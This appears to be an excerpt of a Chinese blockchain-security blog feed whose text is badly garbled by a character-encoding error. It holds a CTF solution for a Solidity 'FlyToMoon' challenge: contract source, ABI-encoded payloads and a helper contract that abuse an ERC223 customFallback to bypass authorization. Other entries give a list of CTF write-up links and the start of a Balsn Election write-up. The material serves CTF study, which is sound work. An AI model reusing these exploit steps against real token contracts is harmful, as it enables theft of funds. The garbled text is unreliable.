    <content type="text"><![CDATA[å‰è¨€ XCTF FINAL äºŒæ¬¡å‡ºé¢˜ï¼Œæ¸…æ™°è®°å¾— 19 å¹´é‚£æ¬¡å‡ºé¢˜çš„ç—›ï¼Œè¢«å„ä½å¸ˆå‚…ç¡¬æ˜¯çŽ©æˆäº† AWD æ¨¡å¼ï¼Œæƒ¨æƒ¨ å›žæƒ³å‡ºé¢˜æ¨¡å¼ç”±æœ€å¼€å§‹çš„å…±äº«åœ°å€ -&gt; é‡‡å–éšæœºæ•°éƒ¨ç½²ä¸åŒçš„åœ°å€ -&gt; geth + POA ç¦ç”¨éƒ¨åˆ† API ï¼Œè®©é€‰æ‰‹æœ‰æ›´å…¬å¹³çš„åšé¢˜ä½“éªŒï¼Œé˜²æ­¢â€œæŠ„ä½œä¸šâ€ï¼Œä¹Ÿç®—æ¯”è¾ƒåœ†æ»¡äº† æœ¬æ¬¡é¢˜ç›®ä¹Ÿæ¯”è¾ƒæ°´ï¼Œå€Ÿé‰´ balsn-Election çš„ ABI Encoding è€ƒç‚¹ï¼Œéšä¾¿å†™å†™ Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175pragma solidity =0.6.12;pragma experimental ABIEncoderV2;interface IERC223 &#123; function name() external view returns (string memory); function symbol() external view returns (string memory); function decimals() external view returns (uint8); function totalSupply() external view returns (uint); function balanceOf(address account) external view returns (uint); function transfer(address to, uint value) external returns (bool); function transfer(address to, uint value, bytes memory data) external returns (bool); function transfer(address to, uint value, bytes memory data, string memory customFallback) external returns (bool); event Transfer(address indexed from, address indexed to, uint value, bytes data);&#125;contract ERC223 is IERC223 &#123; string public override name; string public override symbol; uint8 public override decimals; uint public override totalSupply; mapping (address =&gt; uint) private _balances; string private constant _tokenFallback = &quot;tokenFallback(address,uint256,bytes)&quot;; constructor (string memory _name, string memory _symbol) public &#123; name = _name; symbol = _symbol; decimals = 18; &#125; function balanceOf(address account) public view override returns (uint) &#123; return _balances[account]; &#125; function transfer(address to, uint value) public override returns (bool) &#123; return _transfer(msg.sender, to, value, &quot;&quot;, _tokenFallback); &#125; function transfer(address to, uint value, bytes memory data) public override returns (bool) &#123; return _transfer(msg.sender, to, value, data, _tokenFallback); &#125; function transfer(address to, uint value, bytes memory data, string memory customFallback) public override returns (bool) &#123; return _transfer(msg.sender, to, value, data, customFallback); &#125; function _transfer(address from, address to, uint value, bytes memory data, string memory customFallback) internal returns (bool) &#123; require(from != address(0), &quot;ERC223: transfer from the zero address&quot;); require(to != address(0), &quot;ERC223: transfer to the zero address&quot;); require(_balances[from] &gt;= value, &quot;ERC223: transfer amount exceeds balance&quot;); _balances[from] -= value; _balances[to] += value; if (_isContract(to)) &#123; (bool success,) = to.call&#123;value: 0&#125;( abi.encodeWithSignature(customFallback, msg.sender, value, data) ); assert(success); &#125; emit Transfer(msg.sender, to, value, data); return true; &#125; function _mint(address to, uint value) internal &#123; require(to != address(0), &quot;ERC223: mint to the zero address&quot;); totalSupply += value; _balances[to] += value; emit Transfer(address(0), to, value, &quot;&quot;); &#125; function _isContract(address addr) internal view returns (bool) &#123; uint length; assembly &#123; length := extcodesize(addr) &#125; return (length &gt; 0); &#125;&#125;contract FlyToMoon is ERC223 &#123; struct Person &#123; string name; uint age; string introduction; &#125; address public owner; bytes32[] Hashes; uint public stage; bool private flag1; bool private flag2; bool private flag3; bool private flag4; string public solved = &quot;begin&quot;; constructor() public ERC223(&quot;FlyToMoon&quot;, &quot;FTM&quot;) &#123; owner = msg.sender; &#125; modifier auth &#123; require(msg.sender == address(this) || msg.sender == owner, &quot;FlyToMoon: not authorized&quot;); _; &#125; function game1(address _person, Person memory person, bool flag) public &#123; require(stage==0 &amp;&amp; flag); require(person.age &gt; 20, &quot;BabyEncode: only your age &gt; 20 can paly this game&quot;); flag1 = true; stage = 1; &#125; function game2(uint from, uint idx, uint password, uint len, Person[] memory persons) public auth &#123; require(stage == 1); require(Hashes[idx] == keccak256(abi.encode(persons)), &quot;FlyToMoon: hash incorrect&quot;); require(Hashes[idx+1] == keccak256(abi.encode(password)), &quot;FlyToMoon: password incorrect&quot;); require(Hashes[idx+2] == keccak256(abi.encode(len)), &quot;FlyToMoon: len incorrect&quot;); require(_stringCompare(persons[0].name, &quot;btc&quot;) &amp;&amp; _stringCompare(persons[1].introduction, &quot;fly to moon&quot;)); flag2 = true; &#125; function game3(uint from, uint _len) public auth &#123; uint len; require(stage == 2 &amp;&amp; flag2); assembly &#123; len := sload(6) &#125; require(len==_len); flag3 = true; stage = 3; &#125; function game4(uint _time, Person memory person, uint flag) public auth &#123; require(stage == 3); require(_stringCompare(person.name, &quot;pikapika&quot;)); flag4 = true; &#125; function sethash(bytes32 _hash) public &#123; Hashes.push(_hash); &#125; function isSolved() public &#123; uint tmp; assembly &#123; tmp := sload(8) &#125; if (keccak256(abi.encodePacked(tmp)) == 0xffc411432425ed5cecf9384ab99646c1825e1fe40ce46b953350782d81a6ecc1) &#123; if (balanceOf(address(this)) == 10) &#123; solved = &quot;Fly to Moon&quot;; &#125; &#125; else &#123; solved = &quot;Tian Tai Jian&quot;; &#125; &#125; function giveMeMoney() public &#123; require(balanceOf(msg.sender) == 0, &quot;FlyToMoon: you&apos;re too greedy&quot;); _mint(msg.sender, 1); &#125; function _setStage(uint _stage, uint idx, string memory _command) public auth &#123; require(_stringCompare(_command, &quot;Let me set stage, please!!!!!!!!&quot;)); stage = _stage &amp; 0xff; for(uint i=0; i&lt;=idx; i++) &#123; Hashes.push(0); &#125; &#125; function _stringCompare(string memory a, string memory b) internal pure returns (bool) &#123; return keccak256(abi.encodePacked(a)) == keccak256(abi.encodePacked(b)); &#125;&#125; Analyse å…·ä½“åˆ†æžè¿‡ç¨‹åŠåŽŸå› å°±ä¸å†™äº†ï¼Œä¸å¤ªæ‡‚çš„å°ä¼™ä¼´å¯ä»¥ç¿»ä¸€ç•ªå‰é¢çš„åšå®¢ï¼Œè‡ªè¡Œç†è§£çš„è¿‡ç¨‹ä¼šæ¯”ç®€å•çœ‹ä¸€ç¯‡ WP å¸®åŠ©æ›´å¤§ ï½žï½žå…¶å®žæ˜¯æˆ‘å·æ‡’ :Dï½žï½ž ç›®æ ‡æˆåŠŸè°ƒç”¨ game2 å’Œ game3 ç”Ÿæˆæœ«å°¾ä¸º 01 çš„è´¦æˆ· ä½¿ç”¨ transfer è°ƒç”¨ setstage(1) 1234to: é¢˜ç›®åœ°å€value: 0data: 0x4c6574206d65207365742073746167652c20706c656173652121212121212121cus: &quot;_setStage(uint256,uint256,string)&quot; sethash(0x230fd66aacfe66f0e897312a7aefa3bcd51406d9831619983aca15c7f601ba77) ä¸‹è¿°è„šæœ¬å¯è®¡ç®— [[â€œbtcâ€, 100, â€œtest1â€], [â€œtest2â€, 200, â€œfly to moonâ€]] çš„ç¼–ç  1234567891011121314pragma solidity =0.6.12;pragma experimental ABIEncoderV2;contract Vault &#123; struct Person &#123; string name; uint age; string introduction; &#125; function ballotEncode(Person[] memory persons) pure public returns (bytes32)&#123; return keccak256(abi.encode(persons)); &#125;&#125; sethash(0x41c7ae758795765c6664a5d39bf63841c71ff191e9189522bad8ebff5d4eca98) 1keccak256(abi.encode(0x60)) sethash(0xd971d7a75d56a87205c10f76d77a1984a94b99f0ba39ec86813b6d42a571a285) 1keccak256(abi.encode(0x240)) ä½¿ç”¨æœ«å°¾ä¸º 01 çš„è´¦æˆ·è°ƒç”¨ giveMeMoney() ä½¿ç”¨ transfer è°ƒç”¨ game2(from, 1, 0x60, 0x240, [[â€œbtcâ€, 100, â€œtest1â€], [â€œtest2â€, 200, â€œfly to moonâ€]]) 1234to: é¢˜ç›®åœ°å€value: 1data: 0x00000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000003627463000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000057465737431000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000c800000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000057465737432000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b666c7920746f206d6f6f6e000000000000000000000000000000000000000000cus: &quot;game2(uint256,uint256,uint256,uint256,(string,uint256,string)[])&quot; ç”Ÿæˆæœ«å°¾ä¸º 02 çš„è´¦æˆ· ä½¿ç”¨ transfer è°ƒç”¨ setstage(2) 1234to: é¢˜ç›®åœ°å€value: 0data: 0x4c6574206d65207365742073746167652c20706c656173652121212121212121cus: &quot;_setStage(uint256,uint256,string)&quot; ä½¿ç”¨ä¸‹è¿°è„šæœ¬ï¼Œtimes = 0x9, ä½¿ 02 è´¦æˆ·é‡‘é¢ä¸º 0x9 12345678910contract son &#123; EncodeGame target = EncodeGame(é¢˜ç›®åœ°å€); function getmoney(uint times) public &#123; for (uint i=0; i&lt;times; i++) &#123; target.giveMeMoney(); target.transfer(0x02è´¦æˆ·, 1, &quot;&quot;, &quot;&quot;); &#125; &#125;&#125; ä½¿ç”¨ transfer è°ƒç”¨ game3(from, 5) 1234to: é¢˜ç›®åœ°å€value: 5data: 0x01cus: &quot;game3(uint256,uint256)&quot; ä½¿ç”¨ transfer è°ƒç”¨ setstage(2) 1234to: é¢˜ç›®åœ°å€value: 4data: 0x4c6574206d65207365742073746167652c20706c656173652121212121212121cus: &quot;_setStage(uint256,uint256,string)&quot; è°ƒç”¨ isSolved]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>xctf final</tag>
        <tag>FlyToMoon</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF åŒºå—é“¾é¢˜ç›®é˜²æŠ„ä½œä¸š]]></title>
    <url>%2F2021%2Fctf-eth-env%2F</url>
    <content type="text"><![CDATA[ctf åŒºå—é“¾é˜²æŠ„ä½œä¸šçš„çŽ¯å¢ƒ geth ç§é“¾ + POA æˆ‘åªæ˜¯ä¸ªæ— æƒ…çš„æ¬è¿å·¥ï¼Œåœ¨ç¬¬å…­å±Š xctf final ä¸­åˆæ¬¡ä½¿ç”¨ï¼Œä¸çŸ¥é“åšé¢˜çš„å¸ˆå‚…ä»€ä¹ˆæ„Ÿè§‰ ðŸ‘‰ https://github.com/chainflag/ctf-eth-env ðŸ‘ˆ æ¬¢è¿Ž star æœ‰æƒ³æ³•çš„å¸ˆå‚…ä¹Ÿå¯ä»¥åŠ å…¥æˆ‘ä»¬ chainflag ðŸ™ˆ æ²¡æœ‰å®žè´¨æ€§å†…å®¹ï¼Œæ°´æ–‡ï¼Œå‹¿å–· ðŸ‘€ å…·ä½“çš„æƒ³æ³•ä»‹ç»å‚è€ƒ https://www.iczc.me/post/solution-for-a-fair-ctf-blockchain-env/]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF Wiki ä¸ŠåŠ å…¥ Blockchain ä¸“æ ]]></title>
    <url>%2F2021%2Fctf-wiki%2F</url>
    <content type="text"><![CDATA[å‰è¨€ æœ€è¿‘å’Œ tkmk å¸ˆå‚…ã€ syang å¸ˆå‚…ã€ Ver å¸ˆå‚…ï¼ˆä¸åˆ†é¡ºåºï¼‰èŠ±äº†ä¸€å‘¨çš„æ—¶é—´ï¼Œåœ¨ CTF Wiki ä¸Šå†™äº†å…³äºŽ Blockchain çš„ Topicï¼Œè¿™é‡Œæ˜¯ ðŸ‘‰ CTF Wiki å…¥å£ ðŸ‘ˆ åˆå¿ƒæ˜¯æƒ³ç€ç•™ä¸‹ç‚¹ä»€ä¹ˆä¸œè¥¿ï¼Œå¦‚æžœæœ‰å°ä¼™ä¼´å‘çŽ°é—®é¢˜å¯ä»¥æ issueï¼Œæˆ‘ä»¬çœ‹åˆ°ä¼šåŠæ—¶å›žå¤å¹¶è¿›è¡Œæ›´æ”¹ å¦‚æžœæœ‰æƒ³è¦è¡¥å……å…³äºŽ Blockchain å†…å®¹çš„å°ä¼™ä¼´ï¼Œä¹Ÿå¯ä»¥è”ç³»æˆ‘ åŒæ—¶æˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ª Chain Flag Organizationï¼Œè¿™é‡Œæ˜¯ ðŸ‘‰ Chain Flag å…¥å£ ðŸ‘ˆ ï¼Œæ¬¢è¿Žå…³æ³¨ ðŸ‘€ ï¼Œæœ‰å…´è¶£çš„å°ä¼™ä¼´ä¹Ÿå¯ä»¥åŠ å…¥æˆ‘ä»¬ æˆ‘åœ¨æ‘¸é±¼ï½ž åŽç»­ iczc å¸ˆå‚…è¿˜ä¼šè¡¥å……å…¶ä»–å…¬é“¾å®‰å…¨ç›¸å…³å†…å®¹ï¼Œæ•¬è¯·æœŸå¾… challenges åˆ—è¡¨ Chain Flag çš„ ctf-blockchain-challenges ä»“åº“æœé›†äº†åŽ†å¹´æ¥å…³äºŽåŒºå—é“¾çš„é¢˜ç›®ï¼Œä¹Ÿæ¬¢è¿Žå¤§å®¶è¿›è¡Œ fork æŒ‰ç…§æ ¼å¼è¿›è¡Œè¡¥å…… ä¸‹é¢åˆ—ä¸¾äº†ç›¸åº”é¢˜ç›®å¯¹åº”çš„ WP é“¾æŽ¥ 2021RealWorld é¢˜ç›®åç§° Re: Montagy WP é“¾æŽ¥ 0ops syang pikachu é¢˜ç›®åç§° EasyDefi WP é“¾æŽ¥ https://blog.syang.xyz/2021/01/realworldctf-2020-ethereum/ é¢˜ç›®åç§° billboard WP é“¾æŽ¥ https://github.com/iczc/billboard/blob/main/writeup/readme.md ðŸŒŸctf é¢˜ç›®åç§° StArNDBOX WP é“¾æŽ¥ https://hitcxy.com/2021/6-ctf2021/ 2020é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ› é¢˜ç›®åç§° OwnerMoney WP é“¾æŽ¥ https://hitcxy.com/2020/OwnerMoney/ rctf é¢˜ç›®åç§° roiscoin WP é“¾æŽ¥ https://hitcxy.com/2020/rctf2020-roiscoin/ ç¬¬äº”ç©ºé—´ é¢˜ç›®åç§° CreativityPlus WP é“¾æŽ¥ https://hitcxy.com/2020/creativityplus/ é¢˜ç›®åç§° SafeDelegatecall WP é“¾æŽ¥ https://hitcxy.com/2020/creativityplus/ ç¬¬ä¸€å±Šé’“é±¼åŸŽæ¯ é¢˜ç›®åç§° StrictMathematician WP é“¾æŽ¥ https://hitcxy.com/2020/strictmathematician/ QWB é¢˜ç›®åç§° IPFS WP é“¾æŽ¥ https://hitcxy.com/2020/qwb2020/ é¢˜ç›®åç§° EasyAssembly WP é“¾æŽ¥ https://hitcxy.com/2020/qwb2020/ é¢˜ç›®åç§° EasyFake WP é“¾æŽ¥ https://hitcxy.com/2020/qwb2020/ é¢˜ç›®åç§° EasySandbox WP é“¾æŽ¥ https://hitcxy.com/2020/qwb2020/ é¢˜ç›®åç§° EthGaMe (EGM) WP é“¾æŽ¥ https://hitcxy.com/2020/egm/ é¢˜ç›®åç§° EBK WP é“¾æŽ¥ å¾…è¡¥å…… balsn é¢˜ç›®åç§° Election WP é“¾æŽ¥ shw pikachu é¢˜ç›®åç§° IdleGame WP é“¾æŽ¥ https://x9453.github.io/2021/03/12/Balsn-CTF-2020-IdleGame/ åŽä¸ºäº‘å®‰å…¨ é¢˜ç›®åç§° ethenc WP é“¾æŽ¥ https://hitcxy.com/2020/ethenc/ åŽä¸ºé²²é¹è®¡ç®— é¢˜ç›®åç§° boxgame WP é“¾æŽ¥ https://hitcxy.com/2020/boxgame/ åŽä¸ºé¸¿è’™ é¢˜ç›®åç§° ContractGame WP é“¾æŽ¥ https://hitcxy.com/2020/contractgame/ 2019RealWorld é¢˜ç›®åç§° Montagy WP é“¾æŽ¥ https://x9453.github.io/2020/01/26/Real-World-CTF-Finals-2019-Montagy/ balsn-ctf é¢˜ç›®åç§° Bank WP é“¾æŽ¥ shw pikachu é¢˜ç›®åç§° Creativity WP é“¾æŽ¥ shw pikachu CISCN é¢˜ç›®åç§° Daysbank WP é“¾æŽ¥ https://www.jianshu.com/p/993b513dca97 sissel QWB é¢˜ç›®åç§° babybank WP é“¾æŽ¥ https://beafb1b1.github.io/blockchain/qwb2019_babybank_babybet/ é¢˜ç›®åç§° babybet WP é“¾æŽ¥ https://beafb1b1.github.io/blockchain/qwb2019_babybank_babybet/ Byte é¢˜ç›®åç§° bet WP é“¾æŽ¥ https://beafb1b1.github.io/blockchain/byte2019_bet_hf/ é¢˜ç›®åç§° hf WP é“¾æŽ¥ https://beafb1b1.github.io/blockchain/byte2019_bet_hf/ N1CTF é¢˜ç›®åç§° h4ck WP é“¾æŽ¥ https://hitcxy.com/2019/h4ck/ æ•°å­—ç»æµŽ é¢˜ç›®åç§° cow WP é“¾æŽ¥ https://github.com/beafb1b1/challenges/tree/master/szjj/ssjj_final_cow_rise/cow é¢˜ç›®åç§° rise WP é“¾æŽ¥ https://github.com/beafb1b1/challenges/tree/master/szjj/ssjj_final_cow_rise/rise é¢˜ç›®åç§° jojo WP é“¾æŽ¥ https://hitcxy.com/2019/jojo/ RoarCTF é¢˜ç›®åç§° CoinFlip WP é“¾æŽ¥ https://hitcxy.com/2019/CoinFlip/ Hackergame é¢˜ç›®åç§° JCBank WP é“¾æŽ¥ https://hitcxy.com/2019/JCBank/ xctf final é¢˜ç›®åç§° Happy_DOuble_Eleven WP é“¾æŽ¥ https://hitcxy.com/2019/Happy-DOuble-Eleven/ D^3CTF é¢˜ç›®åç§° bet2loss_v2 WP é“¾æŽ¥ https://hitcxy.com/2019/bet2loss-v2/ De1CTF é¢˜ç›®åç§° Easy EOS WP é“¾æŽ¥ å®˜æ–¹WP f0rm2l1n_wp1 f0rm2l1n_wp2 2018RealWorld é¢˜ç›®åç§° Acoraida Monica WP é“¾æŽ¥ https://github.com/xhyumiracle/defcon27 hctf é¢˜ç›®åç§° ethre WP é“¾æŽ¥ https://xz.aliyun.com/t/3261#toc-20 é¢˜ç›®åç§° bet2loss WP é“¾æŽ¥ https://paper.seebug.org/740/#bet2loss é¢˜ç›®åç§° ez2win WP é“¾æŽ¥ https://paper.seebug.org/740/#ez2win bibi BCTF é¢˜ç›®åç§° Fake3d WP é“¾æŽ¥ https://beafb1b1.github.io/blockchain/bctf2018_fake3d_eosgame/ é¢˜ç›®åç§° EOSGAME WP é“¾æŽ¥ https://beafb1b1.github.io/blockchain/bctf2018_fake3d_eosgame/ WCTF é¢˜ç›®åç§° BelluminarBank WP é“¾æŽ¥ https://github.com/beched/ctf/tree/master/2018/wctf-belluminar/belluminarbank LCTF é¢˜ç›®åç§° easy little trick WP é“¾æŽ¥ https://github.com/LCTF/LCTF2018/tree/master/Writeup/easy%20little%20trick é¢˜ç›®åç§° ggbank WP é“¾æŽ¥ https://github.com/LCTF/LCTF2018/tree/master/Writeup/gg%20bank startctf é¢˜ç›®åç§° web-smart_contract WP é“¾æŽ¥ https://github.com/sixstars/starctf2018/tree/c3eba167d84e7f89f704369c933703951a54f315/web-smart_contract DDCTF é¢˜ç›®åç§° mini blockchain WP é“¾æŽ¥ https://www.anquanke.com/post/id/105835 2017dctf é¢˜ç›®åç§° spock-lizard-alpha WP é“¾æŽ¥ https://github.com/CCSIR/dctf-2017/tree/master/finals/blockchain/rock-paper-scissors-spock-lizard-alpha é¢˜ç›®åç§° spock-lizard-beta WP é“¾æŽ¥ https://github.com/CCSIR/dctf-2017/tree/master/finals/blockchain/rock-paper-scissors-spock-lizard-beta é¢˜ç›®åç§° spock-lizard-omega WP é“¾æŽ¥ https://github.com/CCSIR/dctf-2017/tree/master/finals/blockchain/rock-paper-scissors-spock-lizard-omega]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>CTF Wiki</tag>
        <tag>challenges</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Balsn CTF 2020 - Election]]></title>
    <url>%2F2021%2Fbalsn2020-election%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å¤çŽ° balsn2020 ctf ä¸­çš„ Election åŒºå—é“¾é¢˜ç›®ï¼Œå½“æ—¶æ²¡åšå‡ºæ¥ðŸ˜­ wtcl ï¼Œéƒ½ 2021 äº†ï¼Œè¿˜åœ¨çœ‹ 2020 çš„é¢˜ç›® è¿™ç¯‡ä¼šå†™çš„å¾ˆè¯¦ç»†ï¼Œå¤§ä½¬å‹¿å–·ðŸ™ˆ å…·ä½“åˆ†æžåŠå®˜æ–¹ WP å¦‚ä¸‹ï¼šhttps://x9453.github.io/2021/02/27/Balsn-CTF-2020-Election/ æºç  https://github.com/hitcxy/blockchain-challenges/tree/master/2020/balsn/Election å¤çŽ°åœ°å€ä¸ºï¼šropsten@0xef31471E3004a78Ae403858BbcB27D6d1f37791C å…³äºŽ ABI åŠ ABI Encoding ç›¸å…³çŸ¥è¯†å¯ä»¥æŸ¥çœ‹æˆ‘çš„å¦ä¸€ç‰‡åšå®¢ ðŸ‘‰ Function Selector and Argument Encoding ðŸ‘ˆ Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211pragma solidity =0.6.12;pragma experimental ABIEncoderV2;interface IERC223 &#123; function name() external view returns (string memory); function symbol() external view returns (string memory); function decimals() external view returns (uint8); function totalSupply() external view returns (uint); function balanceOf(address account) external view returns (uint); function transfer(address to, uint value) external returns (bool); function transfer(address to, uint value, bytes memory data) external returns (bool); function transfer(address to, uint value, bytes memory data, string memory customFallback) external returns (bool); event Transfer(address indexed from, address indexed to, uint value, bytes data);&#125;contract ERC223 is IERC223 &#123; string public override name; string public override symbol; uint8 public override decimals; uint public override totalSupply; mapping (address =&gt; uint) private _balances; string private constant _tokenFallback = &quot;tokenFallback(address,uint256,bytes)&quot;; constructor (string memory _name, string memory _symbol) public &#123; name = _name; symbol = _symbol; decimals = 18; &#125; function balanceOf(address account) public view override returns (uint) &#123; return _balances[account]; &#125; function transfer(address to, uint value) public override returns (bool) &#123; return _transfer(msg.sender, to, value, &quot;&quot;, _tokenFallback); &#125; function transfer(address to, uint value, bytes memory data) public override returns (bool) &#123; return _transfer(msg.sender, to, value, data, _tokenFallback); &#125; function transfer(address to, uint value, bytes memory data, string memory customFallback) public override returns (bool) &#123; return _transfer(msg.sender, to, value, data, customFallback); &#125; /* Helper functions */ function _transfer(address from, address to, uint value, bytes memory data, string memory customFallback) internal returns (bool) &#123; require(from != address(0), &quot;ERC223: transfer from the zero address&quot;); require(to != address(0), &quot;ERC223: transfer to the zero address&quot;); require(_balances[from] &gt;= value, &quot;ERC223: transfer amount exceeds balance&quot;); _balances[from] -= value; _balances[to] += value; if (_isContract(to)) &#123; (bool success,) = to.call&#123;value: 0&#125;( abi.encodeWithSignature(customFallback, msg.sender, value, data) ); assert(success); &#125; emit Transfer(msg.sender, to, value, data); return true; &#125; function _mint(address to, uint value) internal &#123; require(to != address(0), &quot;ERC223: mint to the zero address&quot;); totalSupply += value; _balances[to] += value; emit Transfer(address(0), to, value, &quot;&quot;); &#125; function _isContract(address addr) internal view returns (bool) &#123; uint length; assembly &#123; length := extcodesize(addr) &#125; return (length &gt; 0); &#125;&#125;contract Election is ERC223 &#123; struct Proposal &#123; string name; string policies; bool valid; &#125; struct Ballot &#123; address candidate; uint votes; &#125; uint randomNumber = 0; bool public sendFlag = false; //6 address public owner; //6 uint public stage; //7 address[] public candidates; //8 bytes32[] public voteHashes; //9 mapping(address =&gt; Proposal) public proposals; //10 mapping(address =&gt; uint) public voteCount; //11 mapping(address =&gt; bool) public voted; mapping(address =&gt; bool) public revealed; event Propose(address, Proposal); event Vote(bytes32); event Reveal(uint, Ballot[]); event SendFlag(address); constructor() public ERC223(&quot;Election&quot;, &quot;ELC&quot;) &#123; owner = msg.sender; _setup(); &#125; modifier auth &#123; require(msg.sender == address(this) || msg.sender == owner, &quot;Election: not authorized&quot;); _; &#125; function propose(address candidate, Proposal memory proposal) public auth returns (uint) &#123; require(stage == 0, &quot;Election: stage incorrect&quot;); require(!proposals[candidate].valid, &quot;Election: candidate already proposed&quot;); candidates.push(candidate); proposals[candidate] = proposal; emit Propose(candidate, proposal); return candidates.length - 1; &#125; function vote(bytes32 voteHash) public returns (uint) &#123; require(stage == 1, &quot;Election: stage incorrect&quot;); require(!voted[msg.sender], &quot;Election: already voted&quot;); voted[msg.sender] = true; voteHashes.push(voteHash); emit Vote(voteHash); return voteHashes.length - 1; &#125; function reveal(uint voteHashID, Ballot[] memory ballots) public &#123; require(stage == 2, &quot;Election: stage incorrect&quot;); require(!revealed[msg.sender], &quot;Election: already revealed&quot;); require(voteHashes[voteHashID] == keccak256(abi.encode(ballots)), &quot;Election: hash incorrect&quot;); revealed[msg.sender] = true; uint totalVotes = 0; for (uint i = 0; i &lt; ballots.length; i++) &#123; address candidate = ballots[i].candidate; uint votes = ballots[i].votes; totalVotes += votes; voteCount[candidate] += votes; &#125; require(totalVotes &lt;= balanceOf(msg.sender), &quot;Election: insufficient tokens&quot;); emit Reveal(voteHashID, ballots); &#125; function getWinner() public view returns (address) &#123; require(stage == 3, &quot;Election: stage incorrect&quot;); uint maxVotes = 0; address winner = address(0); for (uint i = 0; i &lt; candidates.length; i++) &#123; if (voteCount[candidates[i]] &gt; maxVotes) &#123; maxVotes = voteCount[candidates[i]]; winner = candidates[i]; &#125; &#125; return winner; &#125; function giveMeMoney() public &#123; require(balanceOf(msg.sender) == 0, &quot;Election: you&apos;re too greedy&quot;); _mint(msg.sender, 1); &#125; function giveMeFlag() public &#123; require(msg.sender == getWinner(), &quot;Election: you&apos;re not the winner&quot;); require(proposals[msg.sender].valid, &quot;Election: no proposal from candidate&quot;); if (_stringCompare(proposals[msg.sender].policies, &quot;Give me the flag, please&quot;)) &#123; sendFlag = true; emit SendFlag(msg.sender); &#125; &#125; /* Helper functions */ function _setup() public auth &#123; address Alice = address(0x9453); address Bob = address(0x9487); _setStage(0); propose(Alice, Proposal(&quot;Alice&quot;, &quot;This is Alice&quot;, true)); propose(Bob, Proposal(&quot;Bob&quot;, &quot;This is Bob&quot;, true)); voteCount[Alice] = uint(-0x9453); voteCount[Bob] = uint(-0x9487); _setStage(1); &#125; function _setStage(uint _stage) public auth &#123; stage = _stage &amp; 0xff; &#125; function _stringCompare(string memory a, string memory b) internal pure returns (bool) &#123; return keccak256(abi.encodePacked(a)) == keccak256(abi.encodePacked(b)); &#125; /* custom added functions */ function testdeet(address to, uint value, bytes memory data, string memory customFallback) pure public returns (bytes memory)&#123; return abi.encodeWithSignature(customFallback, to, value, data); &#125; function properEncode(address candidate, Proposal memory proposal, address t1, address t2) pure public &#123; &#125; function ballotEncode(Ballot[] memory ballots) pure public returns (bytes32)&#123; return keccak256(abi.encode(ballots)); &#125;&#125; Analyse è€ƒç‚¹æ˜¯ ERC223 çš„ customFallback é”™è¯¯å¼•å…¥ã€ABI encoding ã€Integer overflow ï¼Œå…³äºŽ ERC223 çš„å®˜æ–¹å®žçŽ°å¯ç‚¹å‡»è¿™é‡Œ ðŸ‘‰ officially recommended implementation ðŸ‘ˆ ç›®æ ‡æˆåŠŸè°ƒç”¨ giveMeFlag() å³å¯ é¢˜ç›®å¤§æ¦‚æ˜¯å®žçŽ°äº†ä¸€ä¸ªæŠ•ç¥¨ç³»ç»Ÿï¼Œæˆ‘ä»¬åªéœ€è¦è®©æˆ‘ä»¬çš„ç¥¨æ•°æœ€å¤šå³å¯ï¼ŒåŒ…æ‹¬ä¸‰ä¸ªé˜¶æ®µï¼šproposeã€voteã€reveal propose : é€šè¿‡ auth éªŒè¯ä¾¿å¯æ·»åŠ æ–°çš„ candidates vote : æŠ•ç¥¨äººæäº¤ ballot æŠ•ç¥¨çš„ hash å€¼ï¼ŒæŠ•ç¥¨çš„æ•°é‡æ˜¯ä»»æ„çš„ï¼Œè¿™é‡Œæ²¡æœ‰é™åˆ¶ reveal : è®¡ç®—æ‰€æœ‰ candidates çš„ç¥¨æ•°æƒ…å†µ ç¬¬ 56 è¡Œçš„è¿™ç§è°ƒç”¨å¯ä»¥é€šè¿‡ auth éªŒè¯ï¼Œå¦‚æžœæŽ§åˆ¶åˆç†ï¼Œå¯ä»¥è°ƒç”¨è‡ªèº«çš„å…¶ä»–å‡½æ•°ï¼Œå› ä¸º customFallback å¯æŽ§ï¼Œå¹¶ä¸”å‚æ•°ä¹Ÿéƒ½å¯æŽ§ï¼Œåªè¦æˆ‘ä»¬æŽ§åˆ¶çš„å‚æ•°ç¬¦åˆ ABI encoding format ï¼Œä¾¿å¯è°ƒç”¨ä»»ä½•å‡½æ•°ï¼Œå…³äºŽ ABI encoding å¯å‚è€ƒ å®˜æ–¹æ–‡æ¡£ï¼Œå…³äºŽå¸¦æœ‰ auth é™åˆ¶çš„ä¸»è¦æœ‰ propose å’Œ _setStage å‡½æ•°ï¼š å½“è°ƒç”¨ customFallback æ—¶ï¼Œä¸‰ä¸ªå‚æ•°ç¼–ç å¦‚ä¸‹å›¾å·¦è¾¹æ‰€ç¤º 